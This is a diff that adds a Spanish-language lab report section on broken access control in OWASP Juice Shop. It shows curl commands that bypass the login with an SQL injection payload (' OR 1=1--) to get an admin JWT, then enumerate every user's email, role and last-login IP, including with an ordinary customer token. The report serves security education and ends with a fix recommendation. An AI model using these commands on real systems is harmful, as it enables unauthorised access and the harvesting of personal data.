@@ -355,7 +355,122 @@ Se accedió y descargó exitosamente el archivo \texttt{acquisitions.md} desde e
 % ==========================================================
 \section{Tarea 3: Broken Access Control --- API de Usuarios sin Autenticación}
 
-\textit{(Pendiente de documentación)}
+\subsection{Descripción de la vulnerabilidad}
+
+El control de acceso roto (\textit{Broken Access Control}) corresponde a la categoría \textbf{A01 -- Control de Acceso Roto} del OWASP Top 10 (2021) y está catalogado bajo \textbf{CWE-284} (\textit{Improper Access Control}). Esta vulnerabilidad se produce cuando una aplicación no verifica correctamente los permisos del usuario autenticado antes de conceder acceso a recursos sensibles, permitiendo que usuarios con privilegios bajos accedan a datos que deberían estar restringidos a administradores.
+
+En OWASP Juice Shop, el endpoint REST \texttt{/api/Users} expone el listado completo de todos los usuarios registrados en la aplicación. Si bien el servidor exige un token JWT válido para acceder al recurso (devolviendo \texttt{HTTP 401 Unauthorized} en su ausencia), no verifica el \textit{rol} del usuario autenticado: tanto un administrador como un cliente ordinario (\texttt{customer}) pueden consultar la totalidad de la base de usuarios. El sistema retorna para cada usuario campos como: \texttt{id}, \texttt{username}, \texttt{email}, \texttt{role}, \texttt{lastLoginIp}, \texttt{isActive}, \texttt{createdAt} y \texttt{deletedAt}, información que bajo ninguna circunstancia debería estar disponible para un usuario sin privilegios administrativos.
+
+\subsection{Herramientas utilizadas}
+
+\begin{itemize}
+  \item \textbf{curl}: Herramienta de transferencia HTTP utilizada para realizar peticiones GET al endpoint \texttt{/api/Users} con y sin token de autorización, y para obtener tokens JWT mediante el endpoint de login.
+  \item \textbf{Firefox (Kali Linux)}: Navegador web utilizado para registrar un usuario normal en la aplicación y verificar el comportamiento del endpoint sin credenciales.
+  \item \textbf{Python3}: Intérprete utilizado en línea de comandos para parsear y formatear las respuestas JSON devueltas por la API.
+\end{itemize}
+
+\subsection{Pasos realizados}
+
+\subsubsection{Obtención del token JWT mediante SQL Injection}
+
+Reutilizando la técnica de la Tarea 1, se obtuvo un token JWT de administrador mediante SQL Injection en el endpoint de autenticación. Este token es necesario para superar la verificación de presencia de cabecera de autorización:
+
+\begin{lstlisting}[language=bash, caption={Obtención del token JWT de administrador mediante SQL Injection}]
+TOKEN=$(curl -s -X POST http://192.168.40.11:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"' OR 1=1--\",\"password\":\"a\"}" | \
+  python3 -c "import sys,json; \
+  print(json.load(sys.stdin)['authentication']['token'])")
+echo "TOKEN: $TOKEN"
+\end{lstlisting}
+
+\subsubsection{Consulta del endpoint /api/Users sin autenticación}
+
+Primero se verificó que el endpoint devuelve \textbf{HTTP 401 Unauthorized} cuando se accede sin token, confirmando que existe una validación mínima de presencia de credenciales:
+
+\begin{lstlisting}[language=bash, caption={Verificación del rechazo sin token de autorización}]
+curl -v http://192.168.40.11:3000/api/Users 2>&1 | grep "< HTTP"
+# HTTP/1.1 401 Unauthorized
+\end{lstlisting}
+
+\subsubsection{Enumeración de usuarios con token de administrador}
+
+Con el token obtenido, se realizó la petición GET al endpoint para obtener el listado completo de usuarios en formato JSON:
+
+\begin{lstlisting}[language=bash, caption={Consulta de /api/Users con token JWT y formateo de la respuesta}]
+curl -s http://192.168.40.11:3000/api/Users \
+  -H "Authorization: Bearer $TOKEN" \
+  | python3 -m json.tool | tee curl_api_users.txt
+\end{lstlisting}
+
+El servidor respondió con \textbf{HTTP 200 OK} retornando un array \texttt{data[]} con todos los usuarios registrados. La respuesta incluye campos sensibles como dirección de correo electrónico, rol en la aplicación, dirección IP del último inicio de sesión y estado de la cuenta.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../../img/tarea3/t3_api_users_raw.png}
+  \caption{\textit{Respuesta completa del endpoint \texttt{/api/Users} en formato JSON, mostrando todos los usuarios registrados en Juice Shop obtenida con token JWT de administrador.}}
+\end{figure}
+
+\subsubsection{Extracción estructurada de datos de usuarios}
+
+Se procesó la respuesta JSON para extraer los campos de mayor valor informativo: rol, correo electrónico e IP de último login de cada usuario:
+
+\begin{lstlisting}[language=bash, caption={Extracción de roles, emails e IPs de todos los usuarios}]
+curl -s http://192.168.40.11:3000/api/Users \
+  -H "Authorization: Bearer $TOKEN" | python3 -c \
+  "import sys,json;[print('['+u['role'].upper()+'] '+u['email'] \
+  +' | ip: '+str(u['lastLoginIp'])+' | active: '+str(u['isActive'])) \
+  for u in json.load(sys.stdin)['data']]" | tee emails_extracted.txt
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../../img/tarea3/t3_api_users_json.png}
+  \caption{\textit{Lista de todos los usuarios del sistema con roles, correos electrónicos e IPs de último login extraídos de la respuesta JSON de \texttt{/api/Users}.}}
+\end{figure}
+
+\subsubsection{Verificación con usuario de rol customer}
+
+Para demostrar que la vulnerabilidad no depende de privilegios de administrador, se registró un usuario ordinario desde el navegador en \texttt{/\#/register} con el correo \texttt{normal@test.com} y rol \texttt{customer}. Se obtuvo su token JWT y se consultó el mismo endpoint:
+
+\begin{lstlisting}[language=bash, caption={Login de usuario normal y consulta a /api/Users}]
+TOKEN_NORMAL=$(curl -s -X POST \
+  http://192.168.40.11:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"normal@test.com","password":"Test1234!"}' | \
+  python3 -c "import sys,json; \
+  print(json.load(sys.stdin)['authentication']['token'])")
+
+curl -s http://192.168.40.11:3000/api/Users \
+  -H "Authorization: Bearer $TOKEN_NORMAL" | python3 -c \
+  "import sys,json;[print('['+u['role'].upper()+'] '+u['email'] \
+  +' | ip: '+str(u['lastLoginIp'])) \
+  for u in json.load(sys.stdin)['data']]"
+\end{lstlisting}
+
+El endpoint respondió con el mismo listado completo de usuarios, confirmando que la aplicación no discrimina por rol: cualquier usuario autenticado, independientemente de sus privilegios, puede enumerar a todos los usuarios del sistema.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.92\textwidth]{../../img/tarea3/t3_browser_api.png}
+  \caption{\textit{Consulta a \texttt{/api/Users} con token de usuario \texttt{customer} (sin privilegios de administrador), obteniendo el listado completo de todos los usuarios registrados en la aplicación.}}
+\end{figure}
+
+\subsection{Funcionamiento del ataque}
+
+La vulnerabilidad de control de acceso roto en el endpoint \texttt{/api/Users} sigue el siguiente flujo de explotación:
+
+\begin{enumerate}
+  \item \textbf{Identificación del endpoint}: El atacante, mediante análisis del tráfico HTTP con Burp Suite o inspección del código fuente del cliente Angular de Juice Shop, identifica el endpoint REST \texttt{/api/Users} como un recurso potencialmente sensible.
+  \item \textbf{Verificación de protección mínima}: Una petición GET sin cabecera \texttt{Authorization} devuelve \texttt{HTTP 401 Unauthorized}, confirmando que el endpoint exige autenticación. Sin embargo, esta protección solo verifica la \textit{presencia} del token, no el \textit{rol} del usuario.
+  \item \textbf{Obtención de un token válido}: El atacante obtiene un JWT válido mediante cualquier mecanismo: registro de cuenta gratuito en la aplicación, SQL Injection en el login, o credenciales comprometidas. No se requieren privilegios especiales.
+  \item \textbf{Enumeración completa de usuarios}: Con el token de cualquier usuario, la petición \texttt{GET /api/Users} con cabecera \texttt{Authorization: Bearer <token>} devuelve \texttt{HTTP 200 OK} con el listado completo de todos los usuarios registrados, incluyendo sus correos electrónicos, roles, IPs de acceso y estado de la cuenta.
+  \item \textbf{Ausencia de control por rol}: El servidor de Juice Shop (Node.js/Express) no implementa una verificación del campo \texttt{role} contenido en el payload del JWT antes de retornar la respuesta, permitiendo que usuarios con rol \texttt{customer} accedan a datos reservados para administradores.
+\end{enumerate}
+
+\subsection{Resultado}
+
+Se logró la enumeración completa de todos los usuarios registrados en OWASP Juice Shop sin necesidad de privilegios administrativos, utilizando únicamente un token JWT de usuario ordinario. La respuesta del endpoint \texttt{/api/Users} expuso para cada cuenta información de alto valor: dirección de correo electrónico, rol en la plataforma (\texttt{admin} o \texttt{customer}), dirección IP del último inicio de sesión y estado de activación de la cuenta. Esta información permite a un atacante real construir listas de objetivos para ataques de phishing dirigido, identificar la cuenta de administrador para ataques posteriores, y mapear la base de usuarios completa de la organización. La vulnerabilidad corresponde a \textbf{CWE-284} y \textbf{A01 -- Control de Acceso Roto} del OWASP Top 10 (2021), y su corrección requiere verificar el rol del usuario en cada petición al endpoint, restringiendo el acceso exclusivamente a usuarios con privilegios administrativos.
 
 % ==========================================================
 \end{document}
